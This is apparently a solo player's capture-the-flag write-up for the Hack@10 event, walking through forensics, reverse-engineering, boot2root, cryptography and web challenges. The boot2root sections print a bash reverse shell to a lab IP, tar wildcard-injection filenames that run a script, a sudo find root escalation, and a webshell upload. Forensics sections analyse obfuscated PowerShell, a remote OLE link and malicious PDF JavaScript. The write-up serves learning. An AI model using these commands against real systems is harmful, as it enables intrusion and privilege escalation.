# gdgoc.apu Hack@10 Writeup

**Members: cofastic (solo)**

---

## Forensics

### 1.1 MEOWWW

![MEOWWW Challenge](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/meowwwchallpic.jpg)

**Challenge Description:**
> Our Incident Response team discovered a suspicious cute image lurking within the system, hinting at a hidden payload and potential attacker activity—it's up to you to analyze the evidence and uncover the truth.

We are given a single file: **chal.jpg** — a JPEG image of a cat.

#### Solution Walkthrough

**Step 1: Initial File Analysis**

First, we examine the file to confirm its type and note the file size. A larger-than-expected JPEG could indicate hidden data.

```bash
$ file chal.jpg
chal.jpg: JPEG image data, JFIF standard 1.02, 1600x1598

$ ls -la chal.jpg
-rw-r--r-- 1 user user 261423 Mar 27 14:02 chal.jpg
```

The file is a standard JPEG. At ~261 KB for a 1600x1598 image, nothing immediately suspicious from size alone. We need to dig deeper.

**Step 2: Check for Appended Data**

A common steganography technique is appending data after the JPEG end-of-file marker (FF D9). We check for trailing bytes:

```python
$ python3 -c "
data = open('chal.jpg','rb').read()
idx = data.rfind(b'\xff\xd9')
print(f'Last FF D9 at offset: {idx}')
print(f'Bytes after FF D9: {len(data) - idx - 2}')
"
Last FF D9 at offset: 261421
Bytes after FF D9: 0
```

No trailing data — nothing appended after the JPEG EOF marker. This rules out simple file concatenation techniques.

**Step 3: Check for Embedded File Signatures**

```bash
$ strings chal.jpg | grep -iE 'flag|hack|ctf|hidden|secret'
(no results)
```

No plaintext flags or recognizable embedded file headers.

**Step 4: Attempt LSB Steganography**

We try extracting Least Significant Bit (LSB) data from the pixel channels:

```
Red: 11% printable
Green: 11% printable
Blue: 11% printable
```

Very low printable content across all channels — no meaningful LSB-embedded data. This makes sense because JPEG is a lossy format and destroys LSB data during compression. JPEG uses DCT (Discrete Cosine Transform) compression which destroys pixel-level LSB data. Tools like **steghide** hide data in the DCT coefficients instead, which survive JPEG compression.

**Step 5: Steghide Extraction**

Since this is a JPEG and standard techniques failed, we try **steghide**. First with an empty password, then common passwords:

```bash
$ steghide info chal.jpg
"chal.jpg":
  format: jpeg
  capacity: 16.0 KB

$ steghide extract -sf chal.jpg -p "" -xf output.txt
steghide: could not extract any data with that passphrase!
```

Empty password fails. The challenge description mentions "hidden" payload, so we try that as the passphrase:

![Steghide Extraction](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/meowww1.png)

Success! The passphrase was **hidden** — hinted at in the challenge description ("hidden payload").

**Step 6: Analyze the Extracted Payload**

![Extracted Payload](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/meowww2.png)

This is an **obfuscated PowerShell command** — a classic malware/red team technique. The mixed casing (`nEW-objECt`, `SYstem.iO.COMPreSsIon`) is used to **evade case-sensitive signature detection**.

**Step 7: Deobfuscate the PowerShell Payload**

**Layer 1: The IEX Trick**

`$eNV:cOmSPEc[4,15,25]-JOIn''` accesses the COMSPEC environment variable (`C:\WINDOWS\system32\cmd.exe`) and extracts characters at indices 4, 15, 25 which spell **iex** (Invoke-Expression).

**Layer 2: Base64 + Deflate Decompression**

```python
$ python3 -c "
import base64, zlib
b64 = 'UzF19/UJV7BVUMpITM42NKguMCg3LopPMU42SDGuVQIA'
raw = base64.b64decode(b64)
decompressed = zlib.decompress(raw, -zlib.MAX_WBITS)
print(decompressed)
"
b'$5GMLW = "hack10{p0w3r_d3c0d3}"'
```

![Deobfuscated Output](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/meowww3.png)

**Flag: `hack10{p0w3r_d3c0d3}`**

---

### 1.2 Malware Or Not?

![Malware Or Not Challenge](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/malwareornot1.jpg)

**Challenge Description:**
> Identify the suspicious URL that acts as an Indicator of Compromise (IoC) in the document. Analyze the provided file within a controlled environment.

We are given a file called **malware__1_.doc** and tasked with finding a suspicious URL. The flag format is `hack10{url}`.

#### Solution Walkthrough

**Step 1: Initial File Analysis**

```bash
$ file malware__1_.doc
malware__1_.doc: Microsoft OOXML
```

This is already suspicious. The file has a **.doc** extension (old Word 97-2003 format), but it's actually **OOXML** — the modern Office format which is ZIP-based.

**Step 2: Extraction — Treating It as a ZIP Archive**

```bash
$ unzip malware__1_.doc -d malware_extracted
inflating: malware_extracted/[Content_Types].xml
inflating: malware_extracted/word/document.xml
inflating: malware_extracted/word/settings.xml
inflating: malware_extracted/word/_rels/document.xml.rels
...
```

**Step 3: The Key File — Relationships File**

```bash
$ cat malware_extracted/word/_rels/document.xml.rels
```

![Relationships File](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/malwareornot2.png)

There it is. A relationship with:
- **Id:** rId999 — a suspiciously high ID
- **Type:** oleObject — an embedded OLE object pointing externally
- **TargetMode:** External — meaning it reaches out to a remote server
- **Target:** `https://happy.divide.cloud/nowyouknow.html`

**Step 4: Understanding the Attack**

This is a technique known as **Remote OLE Object Injection** (sometimes called Template Injection). When a victim opens this .doc file in Microsoft Word, Word automatically makes an HTTP request to the target URL silently in the background.

![Malware Analysis](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/malwareornot3.jpg)

**Flag: `hack10{https://happy.divide.cloud/nowyouknow.html}`**

---

### 1.3 Dear Hiring Manager

![Dear Hiring Manager Challenge](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/dearhiringmanager1.jpg)

**Challenge Description:**
> Umbrella Corporation is currently hiring new employees. One day, the hiring manager opens a resume submitted by a candidate. Moments later, all computers and servers across the company suddenly freeze and become unresponsive. As a digital forensic investigator, your task is to analyze the incident and determine what happened.

We are given a file: **resume.pdf** — a seemingly normal resume PDF that caused a company-wide incident.

#### Solution Walkthrough

**Step 1: Initial PDF Inspection**

Opening the PDF, it looks like a normal one-page resume — nothing visually suspicious.

**Step 2: Analyze the PDF Catalog and Objects**

Using Didier Stevens' **pdf-parser.py**, the PDF catalog has an **/OpenAction** pointing to object 5 0, meaning something executes automatically when the PDF is opened.

![PDF Parser Analysis](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/dearhiringmanager2.jpg)

Object 5 contains embedded JavaScript. There is also a separate **/flag (...)** object in the PDF.

![PDF Objects](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/dearhiringmanager3.jpg)

**Step 3: Examine the Embedded JavaScript**

```javascript
var a=["BOPCd","0edrK"," 1i+m"];
var b=["VBeX","U8:","ddd$"];
eval(atob(a.join("") + b.join("")));
```

The joined string becomes: `BOPCd0edrK 1i+mVBeXU8:ddd$`

**Step 4: Identify the Misdirection**

That string is **NOT valid Base64**. The characters `:` and `$` are valid in **Ascii85 (Base85)** encoding but invalid in Base64.

**Step 5: Decode Using Ascii85**

```python
import base64
s = 'BOPCd0edrK 1i+mVBeXU8:ddd$'
print(base64.a85decode(s).decode())
# Output:
hack10{M4l1ci0s_PDF}
```

The separate **/flag** object is a **decoy** — when decoded as Ascii85, it produces non-printable bytes.

![Decoy Object](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/dearhiringmanager4.jpg)

**Flag: `hack10{M4l1ci0s_PDF}`**

---

## Reverse Engineering

### 2.1 Is It Stacy, Is It Becky, Is It Kesha?

![Is It Stacy Challenge](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/isitstacy1.jpg)

**Challenge Description:**
> Can you find out who's email address has access? Kindly submit it in the form of HACK10{email@domain.com}

We are given a file: **registries.exe** — a .NET executable that prompts for an email address.

#### Solution Walkthrough

**Step 1:** Ran the binary — just a prompt asking for an email address.

**Step 2:** Opened in **dnSpy** (ILSpy) for static analysis.

**Step 3: Identify the Decoding Logic (Decoy Trap)**

Found a multi-layer decoded string: `HACK10{7his_is_4_f4k3_fl4g_pls_ign0r3}` — this is the **trap**, it literally says it's fake.

**Step 4: Follow the Actual Program Flow**

The real flow:
1. Prompt for email
2. Call `CheckEmailExists()`
3. Hash the input using MD5
4. Compare with hardcoded hash

**Step 5:** The program fetches a remote email list from `https://appsecmy.com/d22646ad92dfaa334f9fa1c3579b4801.txt`

**Step 6:** Target MD5 hash: `0d103375d4f99df6bc92a931aa8f48b1`

**Step 7: Brute-Force Using the Email List**

```python
import hashlib

target = "0d103375d4f99df6bc92a931aa8f48b1"

with open("emails.txt", "r", encoding="utf-8", errors="ignore") as f:
    for line in f:
        email = line.strip()
        if hashlib.md5(email.encode()).hexdigest() == target:
            print("[+] Found:", email)
            break
```

```
[+] Found: wa00d6d88epd0z1x6gro@rediffmail.com
```

**Flag: `HACK10{wa00d6d88epd0z1x6gro@rediffmail.com}`**

---

### 2.2 Easy RE

![Easy RE Challenge](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/easyre1.jpg)

**Challenge Description:**
> This is can be solve in 5min, warm up first.

We are given an Android APK: **chall.apk**.

#### Solution Walkthrough

**Step 1:** Unpacked the APK — found `classes.dex`, `assets/background.bkp`, `assets/background.txt`.

**Step 2:** Decompiled in jadx — found **ProxyApplication.java** with a hidden payload APK appended to classes.dex, XOR'd with 0xFF.

**Step 3:** Extracted the hidden APK using Python.

**Step 4:** Analyzed payload.apk — found **ImageEncryptor.java** using a native library with a repeating XOR key.

**Step 5: Known-Plaintext Attack**

Since JPEG files start with `FF D8 FF E1`, we recovered the 32-byte XOR key:

```
e7c35ac886acdbfe24cf7b7a68883cae27b5d67f2033f785f7b7349a29f32f9a
```

**Step 6:** Decrypted `background.bkp`:

![Easy RE Flag](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/easyre1flagpic.jpg)

**Flag: `hack10{t3r_ez_X0r}`**

---

### 2.3 Easy RE 2

![Easy RE 2 Challenge](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/easyre2.1.jpg)

**Challenge Description:**
> this is can be solve in 10 min, warm up first

Same structure as Easy RE 1 but with a simpler encryption scheme.

#### Solution Walkthrough

**Step 1:** Unpacked the APK.

**Step 2:** In jadx, the encryption used a **single fixed byte** as the XOR key:

![jadx Analysis](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/easyre2.2.png)

```
0x10 XOR 0xEF = 0xFF
0x37 XOR 0xEF = 0xD8
XOR key = 0xEF (single byte)
```

**Step 3:** Decrypted with Python:

```python
from pathlib import Path
data = Path("assets/background.bkp").read_bytes()
dec = bytes(b ^ 0xEF for b in data)
Path("flag.jpg").write_bytes(dec)
```

![Easy RE 2 Decrypt](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/easyre2.3.jpg)

![Easy RE 2 Flag](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/easyre2.4.jpg)

**Flag: `hack10{minato_namikaze}`**

---

### 2.4 Proton X1337

![Proton X1337 Challenge](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/protonx13371.png)

**Challenge Description:**
> This file seems normal and safe. But it is actually maliciously, secretly transmitting data to a C2. Identify the server, and find the flag.

We are given **ProtonX1337.apk** — a fake Telegram clone with a hidden backdoor.

#### Solution Walkthrough

**Step 1:** Strings search found decoy `HACK10{n0t_A_Fl4g}` and a `backdoorC2` class name.

**Step 2:** Decompiled with Androguard — found three important classes.

**Step 3:** `onCreate()` calls `initializeMediaStorage()` (creates decoy) and `backdoorC2()` (exfiltration).

**Step 4:** C2 URL is split across two LiveLiterals variables to evade string searches:

```java
String val_d1 = "https://appsecmy.com/";
String val_d2 = "pages/liga-ctf-2026";
// -> https://appsecmy.com/pages/liga-ctf-2026
```

**Step 5:** Visited the C2 URL, flag in HTML comment:

![Proton X1337 Flag](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/protonx13371flagpic.png)

**Flag: `HACK10{j3mpu7_s3r74_0W4SP_C7F}`**

---

### 2.5 Detonator

![Detonator Challenge](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/detonator1.jpg)

**Challenge Description:**
> In malware analysis, you can either statically analyze the assembly codes directly, or you can create a snapshot of your sandbox and detonate it inside.

We are given **detonator.exe** — a Windows PE executable.

#### Solution Walkthrough

**Step 1:** Loaded in Ghidra — `main()` calls `check_flag()`.

![Ghidra Analysis](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/detonator2.jpg)

**Step 2:** `check_flag()` constructs a hardcoded path with a decoy flag, checks if it exists, then computes the **MD5 hash** of the path string as the real flag.

```
C:\Users\HACK10{f4k3_fl4g_bu7_y0u_4r3_in_7h3_righ7_7r4ck}\Desktop\local.txt
```

**Step 3:** Reproduced the MD5 hash in Python:

```python
import hashlib
path = r"C:\Users\HACK10{f4k3_fl4g_bu7_y0u_4r3_in_7h3_righ7_7r4ck}\Desktop\local.txt"
print("MD5:", hashlib.md5(path.encode()).hexdigest())
```

![MD5 Output](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/detonator3.jpg)

![Detonator Result](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/detonator4.jpg)

**Flag: `HACK10{be029cf0e9f2eaa5f80489343630befb}`**

---

## Boot2Root

### 3.1 Library-V2 — User

![Library User Challenge](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/libraryuser1.png)

**Challenge Description:**
> Get the user flag through proper enumeration and exploitation of the live VM.

#### Solution Walkthrough

**Step 1: Full Port Scan**

```bash
$ sudo nmap -Pn -sC -sV -O -p- 192.168.100.9

PORT      STATE  SERVICE  VERSION
21/tcp    open   ftp      vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed
22/tcp    open   ssh      OpenSSH 8.9p1 Ubuntu
80/tcp    open   http     Apache httpd 2.4.52
3306/tcp  open   mysql    MySQL
8080/tcp  open   http     nginx 1.18.0
33060/tcp open   mysqlx
```

**Step 2: FTP Anonymous Login**

```bash
$ cat .secret_note.txt
To the new librarian:
Please use the password 'Shhh!KeepQuiet' for your local SSH account.
- Admin
```

**Step 3: SSH as Librarian**

```bash
$ ssh librarian@192.168.100.9
Password: Shhh!KeepQuiet
```

**Step 4: User Flag**

```bash
$ echo 'aGFjazEwezRuMG55bTB1NV9mdHBfdDBfNTVoX3cwMHR9Cg==' | base64 -d
hack10{4n0nym0u5_ftp_t0_55h_w00t}
```

**Flag: `hack10{4n0nym0u5_ftp_t0_55h_w00t}`**

---

### 3.2 Library-V2 — Root

![Library Root Challenge](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/libraryroot1.jpg)

#### Solution Walkthrough

**Step 1:** LinPEAS found a root cron job: `* * * * * root /root/backup.sh`

**Step 2: Tar Wildcard Injection**

```bash
cd /home/librarian/books
echo 'bash -i >& /dev/tcp/192.168.100.5/4444 0>&1' > shell.sh
chmod +x shell.sh
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=bash shell.sh"
```

![Tar Injection](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/libraryroot2.jpg)

**Step 3: Root Shell**

![Root Shell](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/libraryroot3.jpg)

**Step 4: Root Flag**

```bash
$ echo "aGFjazEwe2NyMG5fdDRyX3cxbGRjNHJkXzFuajNjdDEwbl9mdHd9" | base64 -d
hack10{cr0n_t4r_w1ldc4rd_1nj3ct10n_ftw}
```

![Root Flag](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/libraryroot4.jpg)

**Flag: `hack10{cr0n_t4r_w1ldc4rd_1nj3ct10n_ftw}`**

---

### 3.3 Freshman-V2 — User

![Freshman User Challenge](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/freshmanuser1.jpg)

#### Solution Walkthrough

**Step 1:** Nmap scan — ports 21, 80, 3306, 8080, 33060 open.

**Step 2:** Gobuster on port 8080 found `/upload.php`, `/uploads/`.

**Step 3:** Source code disclosure on port 8080 — raw PHP returned instead of executed.

**Step 4:** Hardcoded creds in index.php: `admin / admin`. Upload only blocks `.exe`.

**Step 5:** Uploaded PHP webshell, got RCE as `www-data`.

![Webshell Upload](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/freshmanuser2.jpg)

**Step 6:** Upgraded to reverse shell.

![Reverse Shell](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/freshmanuser3.jpg)

![Shell Received](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/freshmanuser4.jpg)

![Permission Denied](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/freshmanuser5.jpg)

**Step 7:** LinPEAS found `dev_notes.txt` with SSH creds: `freshman / freshman123`.

![Dev Notes](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/freshmanuser6.jpg)

**Step 8:** `su freshman`

![User Switch](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/freshmanuser7.jpg)

**Step 9: User Flag**

```bash
$ echo "aGFjazEwezNhc3lfcDNhc3lfMW4xdDFhbF9hY2Mzc3N9Cg==" | base64 -d
hack10{3asy_p3asy_1n1t1al_acc3ss}
```

![User Flag](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/freshmanuser8.jpg)

**Flag: `hack10{3asy_p3asy_1n1t1al_acc3ss}`**

---

### 3.4 Freshman-V2 — Root

![Freshman Root Challenge](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/freshmanroot1.jpg)

#### Solution Walkthrough

**Step 1:**

```bash
$ sudo -l
User freshman may run the following commands on Hack10-Freshman-V2:
    (ALL) NOPASSWD: /usr/bin/find
```

**Step 2: Exploit sudo find**

```bash
sudo /usr/bin/find . -exec /bin/bash -p \; -quit
```

![Root Shell](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/freshmanroot2.jpg)

**Step 3: Root Flag**

```bash
$ echo "aGFjazEwe3IwMHRfcHIxdjNzY192MWFfczB1ZDBfZjFuZF93MDB0fQo=" | base64 -d
hack10{r00t_pr1v3sc_v1a_s0ud0_f1nd_w00t}
```

![Root Flag](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/freshmanroot3.jpg)

**Flag: `hack10{r00t_pr1v3sc_v1a_s0ud0_f1nd_w00t}`**

---

## Cryptography

### 4.1 Baby Crypto

![Baby Crypto Challenge](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/babycrypto1.jpg)

**Challenge Description:**
> warmup

We are given **chal.py** (encryption script) and **output** (encrypted flag data).

#### Solution Walkthrough

**Step 1:** The script processes the flag 2 bytes at a time, computing SHA-512 digests with random slicing and junk byte prepending.

**Step 2:** Each SHA-512 digest slice is at least 75 hex chars — more than enough to uniquely identify the original 2-byte plaintext via brute force.

**Step 3:** Built a solver that generates SHA-512 digests for all candidate 2-byte plaintexts and matches against the output.

![Baby Crypto Solve](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/babycrypto2.jpg)

**Flag: `hack10{a88dacd5fb88dc4973bb3a56fff9be940bb1f1b83c2b82f3f6daa256267c9786f4cdc70255079e3cfaea9956211e615fe78ee9d5a95a832afff2f09b05c39db4}`**

---

### 4.2 Hakari Domain

![Hakari Domain Challenge](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/hakaridomain1.1.jpg)

**Challenge Description:**
> You learned Hakari's Domain. Will you be able to hit a jackpot and get the flag?

#### Solution Walkthrough

**Step 1:** Server uses `random.getrandbits(32)` with 700 total attempts. 3 correct in a row unlocks jackpot.

**Step 2:** Harvested 624 MT outputs by intentionally guessing wrong, then recovered the full MT19937 state.

**Step 3:** Predicted future values, unlocked jackpot. Each correct guess returned RSA samples with `e = 17`.

**Step 4:** Applied **Håstad's Broadcast Attack** using CRT on 17 samples.

![Hakari Domain Solve](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/hakaridomain1.2.jpg)

**Flag: `hack10{ab3a01603241b0638804acdc5f905cd4}`**

---

### 4.3 Hakari Domain 2

![Hakari Domain 2 Challenge](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/hakaridomain2.1.jpg)

**Challenge Description:**
> Wow you got lucky last time. Now try again with this new domain.

Only 250 attempts. Jackpot uses broken AES instead of RSA.

#### Solution Walkthrough

**Step 1:** Recovered the exact 8-byte seed from 234 leaked outputs using CPython's MT initialization structure.

**Step 2:** Predicted values, unlocked jackpot.

**Step 3:** Server's AES has SubBytes replaced with a dummy — making it a pure **affine transformation** over GF(2).

**Step 4:** Recovered the 128x128 affine matrix using 129 oracle queries.

**Step 5:** Solved the linear system over GF(2) to recover the secret.

![Hakari Domain 2 Solve](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/hakaridomain2.2.jpg)

**Flag: `hack10{22a41542ef29a7f60a4b7b46fcab6174}`**

---

### 4.4 Ancient Text

![Ancient Text Challenge](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/ancienttext1.jpg)

**Challenge Description:**
> Frieren and her party stumble across a monument with an ancient text left by an elf from the past. Can you decrypt it?

#### Solution Walkthrough

**Step 1:** Image contains text in an unknown script:

![Ancient Text Image](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/ancienttext2.jpg)

**Step 2:** Challenge mentions Frieren — identified as the **Ancient Elvish script** from the anime.

![Google Search](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/ancienttext3.jpg)

**Step 3:** Used the fan-decoded alphabet from r/Frieren:

![Decoded Alphabet](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/ancienttext4.jpg)

Decoded text: **THE FLAG IS ZOLTRAAK**

**Flag: `hack10{zoltraak}`**

---

## Miscellaneous

### 5.1 I Accept

![I Accept Challenge](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/iaccept1.jpg)

**Challenge Description:**
> The legal team just pushed a 50-clause update to the BlackVault User Agreement. They claim it's ironclad and that absolutely nobody actually reads these documents anyway. Prove them wrong.

#### Solution Walkthrough

**Step 1:** 50-clause Terms and Conditions page.

**Step 2:** HTML comments hint at hidden CSS content:

![HTML Comments](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/iaccept2.jpg)

```html
<!-- TODO: stop hiding audit notes in CSS. It's confusing the compliance team. -->
```

**Step 3:** Hidden span in Clause 19:

![Hidden Span](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/iaccept3.jpg)

```html
<span class="invisible-fragment">pr1nt_</span>
```

**Step 4:** Hidden footer div:

![Hidden Footer](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/iaccept4.jpg)

```html
<div class="legal-footnote">n3v3rr_l13ss}</div>
```

**Step 5:** CSS pseudo-element:

![CSS Pseudo-Element](https://raw.githubusercontent.com/Cofastic/CTF-Writeups/main/2026/Hack%4010/img/iaccept5.jpg)

```css
#appendix-b::after {
  content: " hack10{f1n3_";
  font-size: 0;
  opacity: 0;
}
```

**Step 6:** Combined: `hack10{f1n3_` + `pr1nt_` + `n3v3rr_l13ss}`

**Flag: `hack10{f1n3_pr1nt_n3v3rr_l13ss}`**

---

That wraps up all the challenges I solved in gdgoc.apu Hack@10! It was a challenging but rewarding experience covering forensics, reverse engineering, boot2root, cryptography, and miscellaneous categories.

**Thanks for reading!**
